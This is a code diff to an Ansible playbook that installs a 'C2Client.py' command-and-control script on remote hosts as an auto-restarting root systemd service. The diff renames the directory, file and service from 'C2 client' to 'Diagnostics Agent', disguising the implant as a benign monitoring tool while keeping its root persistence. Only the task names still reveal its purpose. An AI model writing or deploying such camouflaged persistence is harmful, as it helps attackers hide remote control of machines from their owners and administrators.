@@ -19,7 +19,7 @@
 
     - name: Ensure working directory exists
       file:
-        path: /opt/client
+        path: /var/lib/diagnostics
         state: directory
         owner: root
         group: root
@@ -28,7 +28,7 @@
     - name: Copy the C2 client script to the remote machine
       copy:
         src: C2Client.py
-        dest: /opt/client/C2client.py
+        dest: /var/lib/diagnostics/diagnostics-agent.py
         owner: root
         group: root
         mode: '0755'
@@ -37,21 +37,21 @@
       copy:
         content: |
           [Unit]
-          Description=C2 Client
+          Description=Diagnostics Agent
           After=network.target
 
           [Service]
           Type=simple
-          ExecStart=/usr/bin/python3 /opt/client/C2client.py
+          ExecStart=/usr/bin/python3 /var/lib/diagnostics/diagnostics-agent.py
           Restart=always
           User=root
-          WorkingDirectory=/opt/client
+          WorkingDirectory=/var/lib/diagnostics
           StandardOutput=journal
           StandardError=journal
 
           [Install]
           WantedBy=multi-user.target
-        dest: /etc/systemd/system/c2client.service
+        dest: /etc/systemd/system/diagnostics-agent.service
         owner: root
         group: root
         mode: '0644'
@@ -61,6 +61,6 @@
 
     - name: Enable the C2 client service
       systemd:
-        name: c2client.service
+        name: diagnostics-agent.service
         enabled: true
         state: started
